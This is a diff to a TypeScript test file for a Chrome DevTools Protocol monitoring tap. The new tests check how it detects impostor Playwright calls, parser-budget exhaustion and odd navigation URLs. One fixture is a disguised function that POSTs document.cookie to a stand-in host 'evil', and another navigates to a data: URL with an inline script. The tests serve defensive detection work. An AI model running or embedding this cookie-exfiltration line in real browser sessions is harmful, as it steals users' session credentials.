@@ -162,6 +162,8 @@ test('CdpSessionTap parses Playwright 1.64 Runtime.callFunctionOn, input length-
   const entries = tap.entries.filter((e): e is CdpEntry => e.rec !== '_tap.summary')
   const callFn = entries.find(e => e.method === 'Runtime.callFunctionOn')!
   assert.equal(callFn.summary?.wrapper, 'playwright-utility')
+  assert.equal(typeof callFn.summary?.fnLen, 'number')
+  assert.equal(typeof callFn.summary?.fnHash64, 'string')
   assert.equal(callFn.summary?.argc, 1)
   assert.ok((callFn.summary?.argSummary as any)[0].preview.includes('[REDACTED:vault]'))
   assert.ok(!JSON.stringify(callFn).includes('SecretArgValue'))
@@ -218,4 +220,77 @@ test('unknown CDP method names are bounded to 256 in _tap.summary and createDriv
   drive1.close()
   drive2.close()
   assert.equal(vault.scrub('code=654321 pw=AlphaPass').text, 'code=[REDACTED:vault] pw=[REDACTED:vault]')
+})
+
+test('P1-1 impostor Playwright wrapper is rejected, flagged high severity, and records fnLen/fnHash64/fn', () => {
+  const tap = new CdpSessionTap({ projection: 'semantic+samples', isLive: () => false, coalesceMs: 10 })
+  const conn = tap.attachConnection()
+  const impostor = {
+    id: 1,
+    sessionId: 's1',
+    method: 'Runtime.callFunctionOn',
+    params: {
+      functionDeclaration: "(u)=>{fetch('https://evil/x',{method:'POST',body:document.cookie})} /* utilityScript.evaluate */",
+      objectId: 'obj-1',
+      arguments: [
+        { objectId: 'obj-1' },
+        { value: true },
+        { value: true },
+        { value: '() => 1' },
+        { value: 0 },
+      ],
+    },
+  }
+  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify(impostor))))
+  tap.seal()
+  const entry = tap.entries.find((e): e is CdpEntry => e.method === 'Runtime.callFunctionOn')!
+  assert.equal(entry.summary?.wrapper, 'impostor')
+  assert.equal(entry.severity, 'high')
+  assert.ok((entry.summary?.fnLen as number) > 50)
+  assert.equal(typeof entry.summary?.fnHash64, 'string')
+  assert.match(String(entry.summary?.fn), /evil\/x/)
+})
+
+test('P1-2 17 unfinished fragmented CDP frames exhausting parser budget never disable main connection tap and keep counting methods', () => {
+  const tap = new CdpSessionTap({ projection: 'semantic', isLive: () => false, coalesceMs: 10, maxParserBytes: 1024 * 1024 })
+  // 17 extra connections each start a 62 KiB unfinished fragmented frame (FIN=0) holding 1 MiB
+  const chunk62k = Buffer.alloc(62 * 1024, 0x41)
+  for (let i = 0; i < 17; i++) {
+    const c = tap.attachConnection()
+    c.feed(encodeWsFrame(chunk62k, { fin: false, opcode: 0x1 }))
+  }
+  // Main connection still tracks frames, sniffs method, counts Runtime.evaluate, and never disables!
+  const main = tap.attachConnection()
+  main.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Runtime.evaluate', params: { expression: '1+1' } }))))
+  main.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: 'Page.reload' }))))
+  tap.seal()
+
+  const summary = tap.entries.find(e => e.rec === '_tap.summary') as any
+  assert.equal(summary.tapDisabledCount, 0, 'budget exhaustion must never disable tap')
+  assert.equal(summary.methodCounts['Runtime.evaluate'], 1, 'Runtime.evaluate counted despite exhausted parser budget')
+  assert.equal(summary.methodCounts['Page.reload'], 1, 'subsequent frame boundaries still tracked')
+  const oversized = tap.entries.filter((e): e is CdpEntry => e.method === '_tap.oversized')
+  assert.ok(oversized.some(e => e.severity === 'high' && e.summary?.reason === 'budget' && e.summary?.innerMethod === 'Runtime.evaluate'))
+})
+
+test('P2-12/13/14 non-http nav URLs preserve scheme, prototype method names stay safe, and unparseable text frames are traced', () => {
+  const tap = new CdpSessionTap({ projection: 'semantic', isLive: () => false, coalesceMs: 10 })
+  const conn = tap.attachConnection()
+  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 1, method: 'Page.navigate', params: { url: 'data:text/html,<script>alert(1)</script>' } }))))
+  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 2, method: '__proto__' }))))
+  conn.feed(encodeWsFrame(Buffer.from(JSON.stringify({ id: 3, method: 'constructor' }))))
+  conn.feed(encodeWsFrame(Buffer.from('not-valid-json{{{')))
+  tap.seal()
+
+  const nav = tap.entries.find((e): e is CdpEntry => e.method === 'Page.navigate')!
+  assert.equal(nav.severity, 'high')
+  assert.match(String(nav.summary?.url), /^data:text\/html;len=/)
+  assert.ok(!String(nav.summary?.url).includes('<script>'))
+
+  const unparsed = tap.entries.find((e): e is CdpEntry => e.method === '_tap.unparsed')
+  assert.ok(unparsed && unparsed.severity === 'high')
+
+  const summary = tap.entries.find(e => e.rec === '_tap.summary') as any
+  assert.equal(summary.methodCounts._unknown_other, 2)
+  assert.equal(summary.methodCounts._unparsed, 1)
 })
